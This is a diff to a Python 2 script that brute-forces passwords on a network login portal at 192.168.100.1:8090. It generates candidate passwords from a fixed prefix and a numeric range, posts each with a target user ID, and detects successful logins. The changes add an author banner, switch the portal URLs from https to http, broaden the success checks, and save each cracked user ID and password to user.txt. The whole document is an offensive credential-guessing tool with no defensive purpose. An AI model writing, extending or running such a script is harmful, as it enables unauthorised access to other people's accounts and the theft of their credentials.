@@ -6,7 +6,18 @@ import urllib
 import time
 import datetime
 import urllib2
+import sys
 import xml.dom.minidom as XML
+
+#CountDown And Credits
+def countdown(num):
+    for i in xrange(num,0,-1):
+        time.sleep(1)
+        sys.stdout.write(str(i%10)+'\r')
+        sys.stdout.flush()
+        
+print 'MADE BY - "XPLORE" '
+countdown(5)
 userid = raw_input("enter user id:")
 test=[]
 range_st=int(raw_input("Enter the starting number:"))
@@ -16,7 +27,7 @@ for i in range(range_st,range_ed+1):
               test.append('ft$b'+str(i))
 print len(test)
 def sendLoginRequest(username, password):
-    url = 'https://192.168.100.1:8090/httpclient.html'
+    url = 'http://192.168.100.1:8090/httpclient.html'
     post_data = 'mode=191' + '&username=' + username + '&password=' + password
     try:
         req = urllib2.Request(url, post_data)
@@ -27,23 +38,28 @@ def sendLoginRequest(username, password):
         print response
         if 'successfully' in response:
             return True
-        if 'limit' in response:
+        elif 'Limit' in response:
             return True
-        if 'data' in response:
+        elif 'Maximum' in response:
+            return True
+        elif 'data' in response:
             return True
             
     except:
-        return False    
+        return False
+    
 for l in test:
     print l
-    if sendLoginRequest(userid, l) == True:
-        #urllib.urlopen("http://google.com")
+    if sendLoginRequest(userid, l) == True:        
         print 'success!!! and '+l+' - password, userid -'+userid
+        with open("user.txt","a") as myfile:
+            myfile.write(userid+" "+str(l)+'\n')
+            break
         break
 
 lgt = raw_input("do you want to log out -type yes  :")
 def sendLogoutRequest(username):
-    url = 'https://192.168.100.1:8090/httpclient.html'
+    url = 'http://192.168.100.1:8090/httpclient.html'
     post_data = 'mode=193' + '&username=' + username
     req = urllib2.Request(url, post_data)
     response = urllib2.urlopen(req)
